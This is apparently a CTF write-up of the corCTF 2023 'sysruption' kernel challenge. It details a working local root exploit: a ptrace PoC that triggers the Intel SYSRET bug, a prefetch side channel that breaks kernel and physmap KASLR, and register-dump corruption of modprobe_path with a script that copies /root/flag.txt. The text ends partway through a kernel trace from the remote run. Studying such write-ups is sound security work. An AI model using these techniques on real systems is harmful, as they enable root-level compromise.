---
layout: single
title:  "corCTF 2023: sysruption writeup"
date: 2023-07-30
classes: wide
tags:
  - Exploitation
  - Sidechannels
  - Linux
  - CTF Writeup
---

I played corCTF this weekend and managed to solve two pretty tough challenges. This will be a writeup for the first of those two, sysruption, which I managed to get first-blood on!


{:refdef: style="text-align: center;"}
![first-blood](/assets/corctf-sysruption/first-blood.png)
{: refdef}

As described by the challenge text, sysruption is about:

> A hardware quirk, a micro-architecture attack, and a kernel exploit all in one!

So pretty much a combination of my favorite research topics :D

Plus it had this sick motd!

```
  ██████ ▓██   ██▓  ██████  ██▀███   █    ██  ██▓███  ▄▄▄█████▓ ██▓ ▒█████   ███▄    █
▒██    ▒  ▒██  ██▒▒██    ▒ ▓██ ▒ ██▒ ██  ▓██▒▓██░  ██▒▓  ██▒ ▓▒▓██▒▒██▒  ██▒ ██ ▀█   █
░ ▓██▄     ▒██ ██░░ ▓██▄   ▓██ ░▄█ ▒▓██  ▒██░▓██░ ██▓▒▒ ▓██░ ▒░▒██▒▒██░  ██▒▓██  ▀█ ██▒
  ▒   ██▒  ░ ▐██▓░  ▒   ██▒▒██▀▀█▄  ▓▓█  ░██░▒██▄█▓▒ ▒░ ▓██▓ ░ ░██░▒██   ██░▓██▒  ▐▌██▒
▒██████▒▒  ░ ██▒▓░▒██████▒▒░██▓ ▒██▒▒▒█████▓ ▒██▒ ░  ░  ▒██▒ ░ ░██░░ ████▓▒░▒██░   ▓██░
▒ ▒▓▒ ▒ ░   ██▒▒▒ ▒ ▒▓▒ ▒ ░░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒ ▒▓▒░ ░  ░  ▒ ░░   ░▓  ░ ▒░▒░▒░ ░ ▒░   ▒ ▒
░ ░▒  ░ ░ ▓██ ░▒░ ░ ░▒  ░ ░  ░▒ ░ ▒░░░▒░ ░ ░ ░▒ ░         ░     ▒ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░
░  ░  ░   ▒ ▒ ░░  ░  ░  ░    ░░   ░  ░░░ ░ ░ ░░         ░       ▒ ░░ ░ ░ ▒     ░   ░ ░
      ░   ░ ░           ░     ░        ░                        ░      ░ ░           ░
          ░ ░
```

dist:
[patch](/assets/corctf-sysruption/dist/patch.diff)
[bzImage](/assets/corctf-sysruption/dist/bzImage)
[initramfs](/assets/corctf-sysruption/dist/initramfs.cpio.gz)
[kconfig](/assets/corctf-sysruption/dist/kconfig)

exploit:
[exploit.c](/assets/corctf-sysruption/exploit.c)
[exploit](/assets/corctf-sysruption/exploit)

## patchwork

Looking at what was provided for the challenge, there are some kernel files and a run script along with a patchfile.

Here are the contents of the patch:

```diff
--- orig_entry_64.S
+++ linux-6.3.4/arch/x86/entry/entry_64.S
@@ -150,13 +150,13 @@
 	ALTERNATIVE "shl $(64 - 48), %rcx; sar $(64 - 48), %rcx", \
 		"shl $(64 - 57), %rcx; sar $(64 - 57), %rcx", X86_FEATURE_LA57
 #else
-	shl	$(64 - (__VIRTUAL_MASK_SHIFT+1)), %rcx
-	sar	$(64 - (__VIRTUAL_MASK_SHIFT+1)), %rcx
+	# shl	$(64 - (__VIRTUAL_MASK_SHIFT+1)), %rcx
+	# sar	$(64 - (__VIRTUAL_MASK_SHIFT+1)), %rcx
 #endif

 	/* If this changed %rcx, it was not canonical */
-	cmpq	%rcx, %r11
-	jne	swapgs_restore_regs_and_return_to_usermode
+	# cmpq	%rcx, %r11
+	# jne	swapgs_restore_regs_and_return_to_usermode

 	cmpq	$__USER_CS, CS(%rsp)		/* CS must match SYSRET */
 	jne	swapgs_restore_regs_and_return_to_usermode

```

So what is going on here?

The first set of lines which are commented out are doing arithmetic shifts on rcx, the register holding the userspace rip.

The following lines then check if those shifts modified rcx, and if it did it will jump to the a different exit path `swapgs_restore_regs_and_return_to_usermode` instead of continuing in `entry_SYSCALL_64`.

Without needing to look into what the shifts are doing, it is pretty clear from the comment that this change is just removing the address canonicality checks on the userspace rip.

A look at the context of this patch reveals an [even more helpful comment](https://elixir.bootlin.com/linux/v6.3.4/source/arch/x86/entry/entry_64.S#L139) in the source:

```
/*
 * On Intel CPUs, SYSRET with non-canonical RCX/RIP will #GP
 * in kernel space.  This essentially lets the user take over
 * the kernel, since userspace controls RSP.
 *
 * If width of "canonical tail" ever becomes variable, this will need
 * to be updated to remain correct on both old and new CPUs.
 *
 * Change top bits to match most significant bit (47th or 56th bit
 * depending on paging mode) in the address.
 */
```

So removing the canonicality checks, as this patch does, theoretically should reintroduce the Intel SYSRET bug and let us "take over the kernel", sounds fun.

## sysret background

I was already familiar with this bug as I had actually looked into a while back after my professor for advanced operating systems mentioned it, so I had a pretty immediate understanding of what was going on here. But I'd like to give some background based on my understanding of the bug for those who arent familiar.

Essentially, the sysret bug is about a difference between how AMD and Intel implement the sysret instruction. Though I should note that while I think most people would consider this a bug in Intel's implementation of sysret, Intel does not since it behaves according to their specifications, which... I guess?

Here are snippets of pseudocode for sysret from the Intel and AMD manuals:

```c
------------------ INTEL -------------------|-------------------  AMD ----------------------
...                                         | ...
IF (operand size is 64-bit)                 | SYSRET_64BIT_MODE:
    THEN (* Return to 64-Bit Mode *)        | IF (OPERAND_SIZE == 64) {
    IF (RCX is not canonical) THEN #GP(0);  | {
        RIP := RCX;                         |      CS.sel = (MSR_STAR.SYSRET_CS + 16) OR 3
    ELSE (* Return to Compatibility Mode *) |      ...
        RIP := ECX;                         | }
FI;                                         | ...
...                                         | RIP = temp_RIP
CS.Selector := CS.Selector OR 3;            | EXIT
            (* RPL forced to 3 *)           |
...                                         |
```

The important part here is that the canonicality check on Intel occurs BEFORE the CS selector is set, whereas on AMD there is no builtin canonicality check in the instruction but it will be checked AFTER the CS selector is set when the cpu attempts to fetch the next instruction. The CS selector determines the current privilege level (CPL), CPL 0 is kernel mode and CPL 3 is user mode.

So on Intel CPUs when sysret is executed with a non-canonical instruction pointer a General Protection (GP) fault will be raised in kernel mode!

But on AMD CPUs when sysret is executed with a non-canonical instruction pointer a GP will occur on instruction fetch in user mode.

But why does this distinction matter? well, the issue is in how faults from different privilege levels are handled. On x86 when a fault occurs in CPL 3 the stack pointer will be set to a value defined in the TSS depending on what Desired Privilege Level (DPL) is defined for that fault in the Interrupt Descriptor Table (IDT):

```
Although hardware task-switching is not supported in 64-bit mode, a 64-bit task state segment (TSS) must exist.
Figure 8-11 shows the format of a 64-bit TSS. The TSS holds information important to 64-bit mode and that is not
directly related to the task-switch mechanism. This information includes:
• RSPn — The full 64-bit canonical forms of the stack pointers (RSP) for privilege levels 0-2.
• ISTn — The full 64-bit canonical forms of the interrupt stack table (IST) pointers.
• I/O map base address — The 16-bit offset to the I/O permission bit map from the 64-bit TSS base.
```

{:.caption}
Intel SDM Volume 3 Ch. 8 Section 7: Task Management in 64-Bit Mode

But these stacks are only used when changing from a lower CPL to a higher CPL, if a fault occurs in a CPL greater than or equal to the the desired privilege level DPL for that fault, the current stack is used.

This becomes a problem on Intel CPUs because the the GP occurs at CPL 0 and the IDT descriptor for GP has DPL 0 so no privilege level change occurs, meaning instead of moving to the RSP0 stack pointer from the TSS, as would happen with a fault from user space, the fault will behave as a fault from kernel space and use the current (user controlled) stack pointer. So with a non-canonical instruction pointer the stack location when entering the GP fault handler will be a user controlled address.

Phew, x86 sure is something.

## triggering the bug

But how do you even reach sysret with a non-canonical instruction pointer? After all you need to have execute system call to be in `entry_SYSCALL_64` in the first place, so you can't just jump to a non-canonical address or something since that won't ever hit sysret.

I had a few ideas of how to go about this, one I had heard about [here](https://fail0verflow.com/blog/2012/cve-2012-0217-intel-sysret-freebsd/) was to map the last page before the non-canonical address gap and execute a syscall instruction at the end of that page which would cause rip to be incremented to a non-canonical address when executed, but it seems Linux does not let you map that page. Another idea I had was to use sigreturn to set the user space rip to a non-canonical address which probably would have worked, but I ended up finding a [poc](https://github.com/vnik5287/cve-2014-4699-ptrace/blob/master/poc_v0.c) to trigger the bug using ptrace related to this [blog](https://duasynt.com/blog/cve-2014-4699-linux-kernel-ptrace-sysret-analysis) on a Linux CVE the author found involving sysret.

This poc worked to trigger the bug almost immediately after some fixing up, but the exploitation was far from done.

Cleaned up poc:

```c
void do_sysret(uint64_t addr, struct user_regs_struct *regs_arg) {
    struct user_regs_struct regs;
    int status;
    pid_t chld;

    memcpy(&regs, regs_arg, sizeof(regs));

    if ((chld = fork()) < 0) {
        perror("fork");
        exit(1);
    }

    if (chld == 0) {
        if (ptrace(PTRACE_TRACEME, 0, 0, 0) != 0) {
            perror("PTRACE_TRACEME");
            exit(1);
        }

        raise(SIGSTOP);
        fork();
        return 0;
    }

    waitpid(chld, &status, 0);

    ptrace(PTRACE_SETOPTIONS, chld, 0, PTRACE_O_TRACEFORK);
    ptrace(PTRACE_CONT, chld, 0, 0);

    waitpid(chld, &status, 0);

    regs.rip = 0x8000000000000000; // not-canonical
    regs.rcx = 0x8000000000000000; // not-canonical
    regs.rsp = addr;

    // necessary stuff
    regs.eflags = 0x246;
    regs.r11 = 0x246;
    regs.ss = 0x2b;
    regs.cs = 0x33;

    ptrace(PTRACE_SETREGS, chld, NULL, &regs);
    ptrace(PTRACE_CONT, chld, 0, 0);
    ptrace(PTRACE_DETACH, chld, 0, 0);
}
```

The whole point of triggering this bug is to cause memory corruption through the register dump that occurs in the GP handler, so I tried setting my stack pointer to some writeable kernel data structures to see if I could hijack them. Stepping through the GP handler I could see that it did exactly that! until it all came crashing down...

## surviving the bug

Triggering the bug with a target kernel address in rsp was failing because of a double fault caused by the GP handler unexpectedly executing with user space's gsbase.

The gsbase register is used on Linux to access percpu variables. In the Linux source code it is used by the `current` macro to locate the current task struct, for example. On kernel entry and exit the `swapgs` instruction is executed to switch back and forth between the kernel and user gsbase values since user space is allowed to use a gs segment as well.

e.g. in `entry_SYSCALL_64`:

```nasm
entry_SYSCALL_64:
    swapgs
    mov    QWORD PTR gs:0x6014,rsp
...
    swapgs
    sysretq
```

But since swapgs was executed right before sysret and the GP handler sees that the GP was from kernel mode (CPL was 0) swapgs is not executed again in the GP handler, meaning it executes with a userspace gsbase. This becomes a problem when the GP handler tries to access percpu variables since user space gsbase is usually unused and set to zero so that results in a pagefault.

Lets take a deeper look at what is going on in the GP handler.

```nasm
asm_exc_general_protection:
    cld
    call   error_entry
    mov    rsp,rax
    mov    rdi,rsp
    mov    rsi,QWORD PTR [rsp+0x78]
    mov    QWORD PTR [rsp+0x78],0xffffffffffffffff
    call   exc_general_protection
    jmp    error_return
```

When a GP occurs, execution is redirected to the handler above, which immediately calls into `error_entry`. The `error_entry` function is pretty generic and shared across many of the fault/trap handlers of the kernel, the start of `error_entry` is:

```nasm
error_entry:
    push   rsi
    mov    rsi,QWORD PTR [rsp+0x8]
    mov    QWORD PTR [rsp+0x8],rdi
    push   rdx
    push   rcx
    push   rax
    push   r8
    push   r9
    push   r10
    push   r11
    push   rbx
    push   rbp
    push   r12
    push   r13
    push   r14
    push   r15
    push   rsi
...
```
The start of error entry is what handles storing the registers for interrupts, this is the memory corruption we are trying to exploit, all general purpose registers will be pushed to the stack pointer we control.

Here is where in error entry `swapgs` is skipped if we entered from kernel space.

```nasm
error_entry:
...
    test   BYTE PTR [rsp+0x90],0x3 <-- CPL & 3?
    jz     0xffffffff81c014b2      <-- skip swapgs if 0
    swapgs
...
```

And this is where the gs segment is first used, causing the system to double fault.

```nasm
exc_general_protection:
    push   r13
    mov    r13,rsi
    push   r12
    push   rbp
    mov    rbp,rdi
    push   rbx
    sub    rsp,0x70
    mov    rax,QWORD PTR gs:0x28 <-- fault here :(
```

So how can we survive this?

In the ptrace sysret blog, the author survives the double fault by targeting the IDT in order to hijack the page fault handler to userspace. Unfortunately, we are living in the future meaning we don't have a writeable IDT and SMEP would anyways prevent us from executing off a user space page. So I had to find some other way to survive triggering the bug.

Well the gsbase causing the fault belongs to userspace, but can we control our own gsbase? can we make it point to a kernel address?

My first attempt was to have ptrace set gsbase since I was already using ptrace to set the registers, but as it turns out [ptrace will not set gsbase if the address is greater than TASK_SIZE_MAX](https://elixir.bootlin.com/linux/v6.3.4/source/arch/x86/kernel/ptrace.c#L395) (greater than the max user space address).

```c
    case offsetof(struct user_regs_struct,gs_base):
        if (value >= TASK_SIZE_MAX) <-- sad
            return -EIO;
        x86_gsbase_write_task(child, value);
        return 0;
```

The same is true of `arch_prctl(ARCH_SET_GS)` as well...

Luckily x86 has an extension called fsgsbase that is commonly enabled, which lets gsbase be set from user space via the wrgsbase instruction!

`asm volatile("wrgsbase %0" : : "r" (gsbase));`

So if I just use this instruction to modify user space gsbase in the process triggering the sysret bug and I should survive the fault!

Except... not quite. I first tried setting it to a random read/write kernel address and that got me a little further, but the percpu data contains pointers that the kernel will try to dereference which just becomes double faulting again.

So setting it to some random address wasn't going to cut it, I figured the most stable option would be to just set user space gsbase to kernel gsbase so that when the vulnerability triggered the kernel would be running with the gsbase it expected.

One small problem, kernel gsbase is in physmap... how am I supposed to know where that is? and while I'm at it how am I supposed to know where the kernel itself is? I had been debugging with KASLR disabled, but for remote I'll need leaks somehow...

## Breaking KASLR

So given that triggering the vulnerability will crash the system if the address pointed to by stack pointer is unmapped or gsbase is wrong, how can KASLR be broken independent of this vulnerability? the answer lies in the micro-architecture.

KASLR has been publicly broken for all Intel cpus since 2016. The techinque was discovered by Gruss et al. in 2016 and is referred to as a [Prefetch Attack](https://gruss.cc/files/prefetch.pdf) as it relies on the timing variance of the x86 `prefetch` instructions when executed against cached kernel address translations.

For a simple implementation of a prefetch attack I reached for the [entrybleed poc](https://www.willsroot.io/2022/12/entrybleed.html), which is just a specific use of a prefetch attack for breaking KASLR when KPTI is enabled but the same code works with KPTI disabled as well. This was enough to break KASLR of the kernel image, but I still needed to break physmap KASLR to be able to survive the use of percpu variables...

But that was simple enough, all I had to do was define some ranges and step sizes that work for physmap and add a flag to choose which randomization I want to break.

```c
// largely based on: https://www.willsroot.io/2022/12/entrybleed.html

#define KERNEL_LOWER_BOUND 0xffffffff80000000ull
#define KERNEL_UPPER_BOUND 0xffffffffc0000000ull

#define STEP_KERNEL 0x100000ull
#define SCAN_START_KERNEL KERNEL_LOWER_BOUND
#define SCAN_END_KERNEL KERNEL_UPPER_BOUND
#define ARR_SIZE_KERNEL (SCAN_END_KERNEL - SCAN_START_KERNEL) / STEP_KERNEL

#define PHYS_LOWER_BOUND 0xffff888000000000ull
#define PHYS_UPPER_BOUND 0xfffffe0000000000ull

#define STEP_PHYS 0x40000000ull
#define SCAN_START_PHYS PHYS_LOWER_BOUND
#define SCAN_END_PHYS PHYS_UPPER_BOUND
#define ARR_SIZE_PHYS (SCAN_END_PHYS - SCAN_START_PHYS) / STEP_PHYS

#define DUMMY_ITERATIONS 5
#define ITERATIONS 100

uint64_t sidechannel(uint64_t addr) {
  uint64_t a, b, c, d;
  asm volatile (".intel_syntax noprefix;"
    "mfence;"
    "rdtscp;"
    "mov %0, rax;"
    "mov %1, rdx;"
    "xor rax, rax;"
    "lfence;"
    "prefetchnta qword ptr [%4];"
    "prefetcht2 qword ptr [%4];"
    "xor rax, rax;"
    "lfence;"
    "rdtscp;"
    "mov %2, rax;"
    "mov %3, rdx;"
    "mfence;"
    ".att_syntax;"
    : "=r" (a), "=r" (b), "=r" (c), "=r" (d)
    : "r" (addr)
    : "rax", "rbx", "rcx", "rdx");
  a = (b << 32) | a;
  c = (d << 32) | c;
  return c - a;
}

uint64_t prefetch(int phys)
{
    uint64_t arr_size = ARR_SIZE_KERNEL;
    uint64_t scan_start = SCAN_START_KERNEL;
    uint64_t step_size = STEP_KERNEL;
    if (phys) {
	    arr_size = ARR_SIZE_PHYS;
	    scan_start = SCAN_START_PHYS;
	    step_size = STEP_PHYS;
    }

    uint64_t *data = malloc(arr_size * sizeof(uint64_t));
    memset(data, 0, arr_size * sizeof(uint64_t));

    uint64_t min = ~0, addr = ~0;

    for (int i = 0; i < ITERATIONS + DUMMY_ITERATIONS; i++) {
        for (uint64_t idx = 0; idx < arr_size; idx++)
        {
            uint64_t test = scan_start + idx * step_size;
            syscall(104);
            uint64_t time = sidechannel(test);
            if (i >= DUMMY_ITERATIONS)
                data[idx] += time;
        }
    }

    for (int i = 0; i < arr_size; i++) {
        data[i] /= ITERATIONS;
        if (data[i] < min)
        {
            min = data[i];
            addr = scan_start + i * step_size;
        }
    }

    free(data);

    return addr;
}

int main(int argc, char **argv) {
    struct user_regs_struct regs;

    uint64_t kaslr = prefetch(0) - 0xc00000;
    uint64_t phys = prefetch(1) - 0x100000000;

    printf("KERNEL base %lx\n", kaslr);
    printf("PHYS base %lx\n", phys);
}
```

And boom! KASLR in shambles!

```shell
ctf@corctf:~$ /tmp/exploit
KASLR base ffffffffb5c00000
PHYS base ffff8d9000000000
```

## escalating privileges

With KASLR broken I could set gsbsase to its original value before which gave me a fairly stable way to trigger the sysret bug and survive.

So now the goal is to use the memory corruption from the `error_entry` function I mentioned previously to corrupt some kernel memory with controlled values. I figured that the easiest target would be overwriting `modprobe_path`, a great description of this techinque can be found [here](https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/). Basically overwriting this kernel variable with a path to a file I control the contents of will lead to it being executed as root when a file with an unrecognized header is executed.

```c
int main(int argc, char **argv) {
    struct user_regs_struct regs;

    kaslr = prefetch(0) - 0xc00000;
    phys = prefetch(1) - 0x100000000;

    printf("KASLR base %lx\n", kaslr);
    printf("PHYS base %lx\n", phys);

    gsbase = phys + 0x13bc00000;
    printf("gsbase: %#lx\n", gsbase);

    // create trigger file for modprobe
    system("echo -ne \"\xff\xff\xff\xff\" >> /tmp/bad");
    system("chmod 777 /tmp/bad");

    uint64_t modprobe_path = kaslr + 0x103b840;

    // fill registers with new modprobe path
    uint64_t new_modprobe = 0x0000612f706d742f; // /tmp/a
    for (int i = 0; i < sizeof(regs)/sizeof(new_modprobe); i++) {
	    ((uint64_t *)&regs)[i] = new_modprobe;
    }

    // position register dump over modprobe_path
    do_sysret(modprobe_path + 0xa8, &regs);
}
```

I setup the ptrace registers to be filled with the bytes b"/tmp/a\0\0" to overwrite the default `modprobe_path` and triggered the sysret bug with a stack pointer that cause the registers are pushed on top of the `modprobe_path` variable.

```
gef➤  x/20gx &modprobe_path
0xffffffff8203b840 <modprobe_path>:     0x0000612f706d742f      0x0000612f706d742f
0xffffffff8203b850 <modprobe_path+16>:  0x0000612f706d742f      0x0000612f706d742f
0xffffffff8203b860 <modprobe_path+32>:  0x0000612f706d742f      0x0000000000000246
0xffffffff8203b870 <modprobe_path+48>:  0x0000612f706d742f      0x0000612f706d742f
0xffffffff8203b880 <modprobe_path+64>:  0x0000612f706d742f      0x0000000000000052
0xffffffff8203b890 <modprobe_path+80>:  0x8000000000000000      0x0000612f706d742f
0xffffffff8203b8a0 <modprobe_path+96>:  0x0000612f706d742f      0x0000612f706d742f
0xffffffff8203b8b0 <modprobe_path+112>: 0xffffffffffffffff      0xffffffff81a00191
0xffffffff8203b8c0 <modprobe_path+128>: 0x0000000000000010      0x0000000000010046
0xffffffff8203b8d0 <modprobe_path+144>: 0xffffffff8203b8e8      0x0000000000000018
gef➤  x/s &modprobe_path
0xffffffff8203b840 <modprobe_path>:     "/tmp/a"
```

Incredibly, nothing crashed... yet...

I had created a file at /tmp/a to be executed when I ran the trigger file with a bad header, but when I executed it a page fault occurred and prevented the file at the hijacked modprobe path from being executed...

It turns out I had corrupted more than just modprobe path... at this point I tried a bunch of different offsets of the `modprobe_path` variable hoping one of them might 'just work' but had no such luck, I even gave up on `modprobe_path` at one point and started exploring hijacking `core_pattern` and even seeing if I could safely corrupt a cred struct. None of those ended up working out, for a brief second I considered that maybe I should stop being lazy and just rop. But then I had another idea, what if I could just fix the corruption... with more corruption?

Lets take a closer at what was going wrong when I tried to corrupt `modprobe_path`.

This is the trace the kernel prints when I tried to trigger modprobe:
```
[    5.095502] BUG: unable to handle page fault for address: ffffffff00000208
[    5.096822] #PF: supervisor read access in kernel mode
[    5.098019] #PF: error_code(0x0000) - not-present page
[    5.098661] PGD 202e067 P4D 202e067 PUD 0
[    5.099171] Oops: 0000 [#2] PREEMPT SMP NOPTI
[    5.099704] CPU: 0 PID: 27 Comm: kworker/u2:1 Tainted: G      D            6.3.4 #14
[    5.100631] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Arch Linux 1.16.2-1-1 04/014
[    5.101765] Workqueue: events_unbound call_usermodehelper_exec_work
[    5.102522] RIP: 0010:inc_rlimit_ucounts+0x31/0x70
[    5.103129] Code: f0 48 89 f9 45 31 d2 49 b9 ff ff ff ff ff ff ff 7f 4a 8d 34 c5 70 00 00 00 49 83 8
[    5.105340] RSP: 0018:ffffc900000e3cb8 EFLAGS: 00010282
[    5.105977] RAX: ffffffff00000028 RBX: ffff888100964ec0 RCX: ffffffff8203b6c0
[    5.106850] RDX: 0000000000000001 RSI: 0000000000000070 RDI: ffffffff8203b6c0
[    5.107914] RBP: ffffffff8203b6c0 R08: 0000000000000046 R09: 7fffffffffffffff
[    5.108776] R10: 7fffffffffffffff R11: 0000000000000025 R12: 0000000000000000
[    5.110192] R13: ffffc900000e3df0 R14: 00000000ffffffff R15: 0000000000800100
[    5.111701] FS:  0000000000000000(0000) GS:ffff88813bc00000(0000) knlGS:0000000000000000
[    5.112934] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    5.113974] CR2: ffffffff00000208 CR3: 0000000100ad2002 CR4: 0000000000370ef0
[    5.115356] Call Trace:
[    5.115679]  <TASK>
[    5.115953]  copy_creds+0xb8/0x160
[    5.116388]  copy_process+0x3c6/0x19b0
[    5.116860]  kernel_clone+0x96/0x350
[    5.117313]  ? update_load_avg+0x5f/0x610
[    5.117814]  ? update_load_avg+0x5f/0x610
[    5.118316]  user_mode_thread+0x56/0x80
[    5.118788]  ? __pfx_call_usermodehelper_exec_async+0x10/0x10
[    5.119512]  call_usermodehelper_exec_work+0x2a/0x80
[    5.120120]  process_one_work+0x1b1/0x340
[    5.120616]  worker_thread+0x45/0x3b0
[    5.121063]  ? __pfx_worker_thread+0x10/0x10
[    5.121603]  kthread+0xd1/0x100
[    5.121996]  ? __pfx_kthread+0x10/0x10
[    5.122464]  ret_from_fork+0x29/0x50
[    5.122923]  </TASK>
```

It crashed somewhere in `inc_rlimit_ucounts`, I had no clue why so I set a breakpoint at it, restarted the vm, and ran tried to trigger the bug again.

```
0xffffffff8109e9b1 in inc_rlimit_ucounts ()
   0xffffffff8109e9a6 <inc_rlimit_ucounts+38> cmp    rdi, rcx
   0xffffffff8109e9a9 <inc_rlimit_ucounts+41> cmove  r10, rax
   0xffffffff8109e9ad <inc_rlimit_ucounts+45> mov    rax, QWORD PTR [rcx+0x10]
 → 0xffffffff8109e9b1 <inc_rlimit_ucounts+49> mov    rcx, QWORD PTR [rax+0x1e0]
   0xffffffff8109e9b8 <inc_rlimit_ucounts+56> mov    r9, QWORD PTR [rax+r8*8+0x8]
   0xffffffff8109e9bd <inc_rlimit_ucounts+61> test   rcx, rcx
   0xffffffff8109e9c0 <inc_rlimit_ucounts+64> je     0xffffffff8109e9e4 <inc_rlimit_ucounts+100>
   0xffffffff8109e9c2 <inc_rlimit_ucounts+66> mov    rax, rdx
   0xffffffff8109e9c5 <inc_rlimit_ucounts+69> ds     xadd QWORD PTR [rcx+rsi*1], rax
```

This instruction is what crashes, it is dereferencing some value it got from the address in rcx, so what is rcx?

```
gef➤  x/20gx $rcx
0xffffffff8203b6c0 <init_ucounts>:      0x0000000000000000      0xffffffff810c50b3
0xffffffff8203b6d0 <init_ucounts+16>:   0xffffffff00000028      0x000000008203b730
0xffffffff8203b6e0 <init_ucounts+32>:   0xffffffff8203b6f0      0x18581c54482e2a00
0xffffffff8203b6f0 <init_ucounts+48>:   0x18581c54482e2a00      0xffffffff81e99724
0xffffffff8203b700 <init_ucounts+64>:   0x00007fffade979fc      0x0000000100ad0001
0xffffffff8203b710 <init_ucounts+80>:   0x0000000000370ef0      0xffffffff8203b5f0
0xffffffff8203b720 <init_ucounts+96>:   0xffffffff81e99724      0xffffffff81024f2d
0xffffffff8203b730 <init_ucounts+112>:  0xffff88813bc00001      0x000000000000016e
0xffffffff8203b740 <init_ucounts+128>:  0x0000000080050033      0x0000000000000046
```

Looks like rcx is the address of `init_ucounts` I don't really know what this is for, but I see a user space stack address in there so I'm guessing I accidentally corrupted this...

And it is right up against `modprobe_path`, so definitely my fault.

```
gef➤  p/x (void*)&modprobe_path - (void*)&init_ucounts
$17 = 0x180
```

So I figured what if I could just use more corruption by triggering the sysret bug again to uncorrupt `init_ucounts`.

```
gef> x/20gx &init_ucounts
0xffffffff8203b6c0 <init_ucounts>:      0xffff888100049600	0xffffffff82640160
0xffffffff8203b6d0 <init_ucounts+16>:	0xffffffff8203a320	0x0000002f00000000
0xffffffff8203b6e0 <init_ucounts+32>:	0x0000000000000000	0x0000000000000000
0xffffffff8203b6f0 <init_ucounts+48>:	0x0000000000000000	0x0000000000000000
0xffffffff8203b700 <init_ucounts+64>:	0x0000000000000000	0x0000000000000000
0xffffffff8203b710 <init_ucounts+80>:	0x0000000000000000	0x0000000000000000
0xffffffff8203b720 <init_ucounts+96>:	0x0000000000000000	0x0000000000000000
0xffffffff8203b730 <init_ucounts+112>:	0x000000000000002a	0x0000000000000000
0xffffffff8203b740 <init_ucounts+128>:	0x0000000000000000	0x0000000000000000
```

Above is what `init_ucounts` looks like just after boot, I just had to make it look somewhat like that again hopefully the faults would just go away.

```c
...
    // fixup corrupted init_ucounts
    regs.rbp = 0x0000002d00000000;
    regs.r12 = kaslr + 0x103a320;
    regs.r13 = kaslr + 0x1640160;
    regs.r14 = phys + 0x100049600;

    // position register dump over init_ucounts
    do_sysret(modprobe_path-0xd8, &regs);
...
```

I set up the regisers for ptrace so that the four qwords that are actually set would be set back to their initial values, and gave it a go:

```
gef> x/20gx &init_ucounts
0xffffffff8203b6c0 <init_ucounts>:      0xffff888100049600      0xffffffff82640160
0xffffffff8203b6d0 <init_ucounts+16>:   0xffffffff8203a320      0x0000002e00000000
0xffffffff8203b6e0 <init_ucounts+32>:   0x0000612f706d742f      0x0000000000000246
0xffffffff8203b6f0 <init_ucounts+48>:   0x0000612f706d742f      0x0000612f706d742f
0xffffffff8203b700 <init_ucounts+64>:   0x0000612f706d742f      0x0000000000000054
0xffffffff8203b710 <init_ucounts+80>:   0x8000000000000000      0x0000612f706d742f
0xffffffff8203b720 <init_ucounts+96>:   0x0000612f706d742f      0x0000612f706d742f
0xffffffff8203b730 <init_ucounts+112>:  0xffffffffffffffff      0xffffffff81a00191
0xffffffff8203b740 <init_ucounts+128>:  0x0000000000000010      0x0000000000010046
```

Well, it looks horrible but maybe it is close enough? hopefully?

So I tried triggering my hijacked `modprobe_path` again, and...

```
ctf@corctf:~$ /sysret
KASLR base ffffffff81000000
PHYS base ffff888000000000
gsbase: 0xffff88813bc00000
[    5.115530] general protection fault, maybe for address 0x51: 0000 [#1] PREEMPT SMP NOPTI
...
[    5.150788] general protection fault, maybe for address 0x53: 0000 [#2] PREEMPT SMP NOPTI
...
ctf@corctf:~$ /tmp/bad
/tmp/bad: line 1: : not found
```

I... didn't crash? It actually worked!?!


I went ahead and added a few more lines to my exploit to automatically create /tmp/a which will copy the flag to /tmp where I can read it.

```c
    // called by modprobe
    system("echo -ne \"#!/bin/sh\ncp /root/flag.txt /tmp/heckyeah\nchown ctf:ctf /tmp/heckyeah\" > /tmp/a");
    system("chmod 777 /tmp/a");

    ...

    // trigger modprobe
    system("/tmp/bad");

    // get flag
    system("cat /tmp/heckyeah");
}
```

I tried running this locally and was able to the get the test flag:

```
ctf@corctf:~$ /sysret
KASLR base ffffffff81000000
PHYS base ffff888000000000
gsbase: 0xffff88813bc00000
...
/tmp/bad: line 1: : not found
corctf{test_flag}
ctf@corctf:~$
```

Now to try it on remote!

```
ctf@corctf:~$ chmod +x /tmp/exploit
ctf@corctf:~$ /tmp/exploit
KASLR base ffffffffb5c00000
PHYS base ffff8d9000000000
gsbase: 0xffff8d913bc00000
[   93.372874] general protection fault, maybe for address 0x54: 0000 [#1] PREEMPT SMP NOPTI
[   93.373374] CPU: 0 PID: 83 Comm: exploit Not tainted 6.3.4 #14
[   93.373717] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[   93.374277] RIP: 0010:entry_SYSRETQ_unsafe_stack+0x3/0x6
[   93.374601] Code: 3c 25 d6 0f 02 00 48 89 c7 eb 08 48 89 c7 48 0f ba ef 3f 48 81 cf 00 08 00 00 48 81 cf 00 10 00 00 0f 22 df 58 5f 5c 0f 01 f8 <48> 0f 07 cc 66 66 2e 0f 1f 84 00 00 00 00 00 56 48 8b 74 24 08 48
[   93.375677] RSP: 0018:ffffffffb6c3b8e8 EFLAGS: 00010046
[   93.375988] RAX: 0000000000000054 RBX: 0000612f706d742f RCX: 8000000000000000
[   93.376409] RDX: 0000612f706d742f RSI: 0000612f706d742f RDI: 0000612f706d742f
[   93.376825] RBP: 0000612f706d742f R08: 0000612f706d742f R09: 0000612f706d742f
[   93.377248] R10: 0000612f706d742f R11: 0000000000000246 R12: 0000612f706d742f
[   93.377666] R13: 0000612f706d742f R14: 0000612f706d742f R15: 0000612f706d742f
[   93.378081] FS:  0000612f706d742f(0000) GS:ffff8d913bc00000(0000) knlGS:ffff8d913bc00000
[   93.378552] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   93.378881] CR2: 00007ffc8370b858 CR3: 0000000100ac4004 CR4: 0000000000770ef0
[   93.379292] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
[   93.379712] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
[   93.380129] PKRU: 55555554
[   93.380290] Call Trace:
